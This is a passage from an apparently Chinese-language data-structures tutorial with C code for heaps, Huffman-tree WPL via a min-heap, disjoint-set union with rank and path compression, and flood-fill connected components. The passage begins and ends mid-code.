class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span> (h-&gt;data[cur] &gt; h-&gt;data[parent]) &#123;<br>        swap(&amp;h-&gt;data[cur], &amp;h-&gt;data[parent]);<br>        cur = parent;<br>        parent = (cur - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br>    &#125;<br>    h-&gt;<span class="hljs-built_in">size</span>++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; i++) &#123;<br>        (i &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, h-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> h-&gt;data[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Heap *h, <span class="hljs-keyword">int</span> pos, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> lchild = <span class="hljs-number">2</span> * pos + <span class="hljs-number">1</span>, rchild = <span class="hljs-number">2</span> * pos + <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">int</span> max_idx = pos;<br>    <span class="hljs-keyword">if</span> (h-&gt;data[lchild] &gt; h-&gt;data[max_idx] &amp;&amp; lchild &lt; n)<br>        max_idx = lchild;<br>    <span class="hljs-keyword">if</span> (rchild &lt; n &amp;&amp; h-&gt;data[rchild] &gt; h-&gt;data[max_idx])<br>        max_idx = rchild;<br>    <span class="hljs-keyword">if</span> (max_idx != pos) &#123;<br>        swap(&amp;h-&gt;data[max_idx], &amp;h-&gt;data[pos]);<br>        update(h, max_idx, n);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    swap(&amp;h-&gt;data[<span class="hljs-number">0</span>], &amp;h-&gt;data[--h-&gt;<span class="hljs-built_in">size</span>]);<br>    update(h, <span class="hljs-number">0</span>, h-&gt;<span class="hljs-built_in">size</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">heap_sort</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h-&gt;<span class="hljs-built_in">size</span> - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>        swap(&amp;h-&gt;data[i], &amp;h-&gt;data[<span class="hljs-number">0</span>]);<br>        update(h, <span class="hljs-number">0</span>, i);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(h-&gt;data);<br>    <span class="hljs-built_in">free</span>(h);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Heap *h = (Heap *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Heap));<br>    init(h, <span class="hljs-number">105</span>);<br><br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, val; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;val);<br>        push(h, val);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;m);<br>    <span class="hljs-keyword">while</span> (m--) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, top(h));<br>        pop(h);<br>    &#125;<br>    output(h);<br><br>    heap_sort(h);<br>    output(h);<br><br>    <span class="hljs-built_in">clear</span>(h);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="优先队列">优先队列</span></h3><p>在 C++ 的 STL里，有封装好的优先队列<code>priority_queue</code>，它包含在头文件<code>&lt;queue&gt;</code>里。优先级可以自己定义，默认优先级是权值大的元素优先级高。</p><h4><span id="字符串huffman编码">字符串Huffman编码</span></h4><p>建立Huffman树的方法，在总结 <strong>树</strong> 的部分有说明。</p><blockquote><p>首先统计每个字母在字符串里出现的频率，把每个字母看成一个结点，结点的权值即是字母出现的频率。</p><p>把每个结点看成一棵只有根结点的二叉树，一开始把所有二叉树（结点）都放在一个集合里，接下来开始如下编码：</p><p>步骤一：从集合里取出两个根结点权值最小的树<code>a</code>和<code>b</code>，构造出一棵新的二叉树<code>c</code>，二叉树<code>c</code>的根结点的权值为<code>a</code>和<code>b</code>的根结点权值和，二叉树<code>c</code>的左右子树分别是<code>a</code>和<code>b</code>。（合并）</p><p>步骤二：将二叉树<code>a</code>和<code>b</code>从集合里删除，把二叉树<code>c</code>加入集合里。（更新候选）</p><p>重复以上两个步骤，直到集合里只剩下一棵二叉树，最后剩下的就是哈夫曼树了。</p><p>规定每个有孩子的结点，到左孩子的路径为<code>0</code>，到右孩子的路径为<code>1</code>。每个字母的编码就是根结点到字母对应结点的路径。</p></blockquote><p>计算字符串进行哈夫曼编码后的长度，即哈夫曼树的带权路径长度WPL（Weighted PathLength），也就是每个叶子结点到根结点的距离乘以叶子结点权值结果之和。</p><p>一种简单的计算方法是：当哈夫曼树上结点总个数大于 1 时，哈夫曼树的WPL，等于树上除根结点之外的所有结点的权值之和。如果结点总个数为1，则哈夫曼树的 WPL 即为根结点权值。</p><p>想想Huffman树建立的过程，这种简单的计算WPL的方法，挺直观的。</p><h4><span id="利用小根堆计算huffman树的wpl">利用小根堆计算Huffman树的WPL</span></h4><p>不考虑建立二叉树的步骤，只累加计算每次作为插入结点的权值之和就能得到结果。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Heap</span> &#123;</span><br>    <span class="hljs-keyword">int</span> *data, <span class="hljs-built_in">size</span>;<br>&#125; Heap;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Heap *h, <span class="hljs-keyword">int</span> length_input)</span> </span>&#123;<br>    h-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * length_input);<br>    h-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(Heap *h, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    h-&gt;data[h-&gt;<span class="hljs-built_in">size</span>] = value;<br>    <span class="hljs-keyword">int</span> current = h-&gt;<span class="hljs-built_in">size</span>;<br>    <span class="hljs-keyword">int</span> father = (current - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span> (h-&gt;data[current] &lt; h-&gt;data[father]) &#123;<br>        swap(&amp;h-&gt;data[current], &amp;h-&gt;data[father]);<br>        current = father;<br>        father = (current - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br>    &#125;<br>    h-&gt;<span class="hljs-built_in">size</span>++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>     <span class="hljs-keyword">return</span> h-&gt;data[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Heap *h, <span class="hljs-keyword">int</span> pos, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> lchild = <span class="hljs-number">2</span> * pos + <span class="hljs-number">1</span>, rchild = <span class="hljs-number">2</span> * pos + <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">int</span> max_value = pos;<br>    <span class="hljs-keyword">if</span> (lchild &lt; n &amp;&amp; h-&gt;data[lchild] &lt; h-&gt;data[max_value]) &#123;<br>        max_value = lchild;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (rchild &lt; n &amp;&amp; h-&gt;data[rchild] &lt; h-&gt;data[max_value]) &#123;<br>        max_value = rchild;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (max_value != pos) &#123;<br>        swap(&amp;h-&gt;data[pos], &amp;h-&gt;data[max_value]);<br>        update(h, max_value, n);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    swap(&amp;h-&gt;data[<span class="hljs-number">0</span>], &amp;h-&gt;data[h-&gt;<span class="hljs-built_in">size</span> - <span class="hljs-number">1</span>]);<br>    h-&gt;<span class="hljs-built_in">size</span>--;<br>    update(h, <span class="hljs-number">0</span>, h-&gt;<span class="hljs-built_in">size</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">heap_size</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> h-&gt;<span class="hljs-built_in">size</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Heap *h)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(h-&gt;data);<br>    <span class="hljs-built_in">free</span>(h);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, value, ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    Heap *heap = (Heap *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Heap));<br>    init(heap, n);<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;value);<br>        push(heap, value);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) &#123;<br>        ans = ans + top(heap);<br>    &#125;<br>    <span class="hljs-keyword">while</span> (heap_size(heap) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">int</span> a = top(heap);<br>        pop(heap);<br>        <span class="hljs-keyword">int</span> b = top(heap);<br>        pop(heap);<br>        ans = ans + a + b;<br>        push(heap, a + b);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, ans);<br>    <br>    <span class="hljs-built_in">clear</span>(heap);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="并查集">并查集</span></h2><p>在数据结构里，<strong>森林</strong>是指若干棵互不相交的树的集合。</p><p>并查集（Merge-Find Set），也被称为不相交集合（DisjointSet），是用于解决若干的不相交集合检索关系的数据结构。</p><p>一般并查集有以下几种操作：</p><ol type="1"><li>MAKE-SET(x)：初始化操作，建立一个只包含元素 x 的集合。</li><li>UNION(x, y)：合并操作，将包含 x 和 y 的集合合并为一个新的集合。</li><li>FIND-SET(x)：查询操作，计算 x 所在的集合。</li></ol><p>“并查集”这个词通常既可以指代不相交集合的数据结构，也可以表示其对应的算法。其在有些教材中的英文名称也叫做Disjoint Set Union，表示用于求不相交集合并集的相关算法。</p><p>并查集用有根树来表示集合，树中的每一个结点都对应集合的一个成员，每棵树表示一个集合。</p><p>每个成员都有一条指向父结点的边，整个有根树通过这些指向父结点的边来维护。</p><p>每棵树的根就是这个集合的代表，并且根的父结点是它自己。</p><p>并查集的查询操作，指的是查找出指定元素所在有根树的根结点是谁。</p><p>并查集的合并操作需要用到查询操作的结果。合并两个元素所在的集合，需要首先求出两个元素所在集合的根。接下来将其中一个根结点的父亲设置为另一个根结点。</p><h3><span id="优化方法">优化方法</span></h3><p>并查集的查询操作最坏情况下的时间复杂度为 <span class="math inline">\(O(n)\)</span> 退化成一个单链表。</p><p>其优化方法是，在合并时，将高度较低的树接到高度较高的树根上，可以防止树退化成一条链。</p><blockquote><ol type="1"><li>利用一个数组保存每个节点的所在树的节点总数，即保存每个节点的秩（可视为height）。</li><li>分别获得传入的两个节点所在的树的根节点。</li><li>比较两个根节点是否，相同则返回 false，结束合并操作、</li><li>若两个根节点的秩不同，比较他们的秩的大小。</li><li>将秩较小的根节点的父指针指向秩较大的跟节点。</li><li>更新合并后的根节点的秩，返回 true，结束合并操作。</li></ol></blockquote><p>通过路径压缩的方法可以进一步减少均摊复杂度，此时同一个集合内的节点可以一步找到根节点。同时使用这两种优化方法，可以将每次操作的时间复杂度优化至接近常数级。</p><p>路径压缩指，在进行路径压缩优化时只需在查找根节点时，将待查找的节点的父指针指向它所在的树的根节点。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisjointSet</span>&#123;</span><br>    <span class="hljs-keyword">int</span> *father, *rank;<br>&#125; DisjointSet;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(DisjointSet *s, <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>)</span> </span>&#123;<br>    s-&gt;father = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * <span class="hljs-built_in">size</span>);<br>    s-&gt;rank = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * <span class="hljs-built_in">size</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">size</span>; ++i) &#123;<br>        s-&gt;father[i] = i;<br>        s-&gt;rank[i] = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b ? a : b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find_set</span><span class="hljs-params">(DisjointSet *s, <span class="hljs-keyword">int</span> node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;father[node] != node) &#123;<br>        <span class="hljs-comment">// 递归找到根节点，node的father指向根节点</span><br>        s-&gt;father[node] = find_set(s, s-&gt;father[node]);<br>    &#125;<br>    <span class="hljs-comment">// 回溯过程中，路径上node的father都指向根</span><br>    <span class="hljs-keyword">return</span> s-&gt;father[node];<br>&#125;<br><br><span class="hljs-comment">// 根据高度合并</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">merge</span><span class="hljs-params">(DisjointSet *s, <span class="hljs-keyword">int</span> node1, <span class="hljs-keyword">int</span> node2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ancestor1 = find_set(s, node1);<br>    <span class="hljs-keyword">int</span> ancestor2 = find_set(s, node2);<br>    <span class="hljs-keyword">if</span> (ancestor1 != ancestor2) &#123;<br>        <span class="hljs-keyword">if</span> (s-&gt;rank[ancestor1] &gt; s-&gt;rank[ancestor2]) &#123;<br>            swap(&amp;ancestor1, &amp;ancestor2);<br>        &#125;<br>        s-&gt;father[ancestor1] = ancestor2;<br>        s-&gt;rank[ancestor2] = <span class="hljs-built_in">max</span>(s-&gt;rank[ancestor2], s-&gt;rank[ancestor1] + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(DisjointSet *s)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(s-&gt;father);<br>    <span class="hljs-built_in">free</span>(s-&gt;rank);<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DisjointSet *dsu = (DisjointSet *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(DisjointSet));<br>    init(dsu, <span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">int</span> m, x, y;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;m);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d%d"</span>, &amp;x, &amp;y);<br>        <span class="hljs-keyword">int</span> ans = merge(dsu, x, y);<br>        <span class="hljs-keyword">if</span> (ans) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"success\n"</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"failed\n"</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">clear</span>(dsu);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="连通分量">连通分量</span></h2><p>连通分量就是图 G的最大连通子图。对于一个无向图，使用FloodFill算法可以求得连通分量。</p><blockquote><ol type="1"><li>找到一个没有染色的顶点，将其染为新的颜色 <span class="math inline">\(Color_{new}\)</span>，如果没有则算法结束。</li><li>初始化一个空的队列，并将第一步的顶点插入队列。</li><li>不断获得队首元素的值并弹出，将和队首元素相邻的未染色顶点染为 <span class="math inline">\(Color_{new}\)</span>，并将其加入队列。</li><li>重复执行第一步，直到所有顶点都被染色，算法结束。</li></ol></blockquote><p>FloodFill 的时间复杂度是 <span class="math inline">\(O(V+E)\)</span>，其中广度优先遍历的部分可以替换成深度优先遍历，复杂度是一样的。通常考虑到递归调用的时间开销，往往广度优先遍历的效率要更高一些。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_N 1000</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Graph</span> &#123;</span><br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> color[MAX_N];<br>    <span class="hljs-keyword">int</span> mat[MAX_N][MAX_N];<br>&#125; Graph;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_Graph</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> input_n)</span> </span>&#123;<br>    g-&gt;n = input_n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; i++) &#123;<br>        g-&gt;color[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; j++) &#123;<br>            g-&gt;mat[i][j] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Graph *g, <span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>    g-&gt;mat[x][y] = <span class="hljs-number">1</span>;<br>    g-&gt;mat[y][x] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">floodfill</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> color_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> q[MAX_N];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (g-&gt;color[i] == <span class="hljs-number">0</span>) &#123;<br>            color_cnt++;<br>            g-&gt;color[i] = color_cnt;<br>            <span class="hljs-keyword">int</span> l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>            q[r++] = i;<br>            <span class="hljs-comment">// 遍历相邻未染色节点，通过队列，广度优先染色</span><br>            <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>                <span class="hljs-keyword">int</span> vertex = q[l++];<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;n; j++) &#123;<br>                    <span class="hljs-keyword">if</span> (g-&gt;mat[vertex][j] &amp;&amp; g-&gt;color[j] == <span class="hljs-number">0</span>) &#123;<br>                        g-&gt;color[j] = color_cnt;<br>                        q[r++] = j;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// output print</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;n; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d %d\n"</span>, i, g-&gt;color[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    Graph *g = (Graph *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Graph));<br>    init_Graph(g, 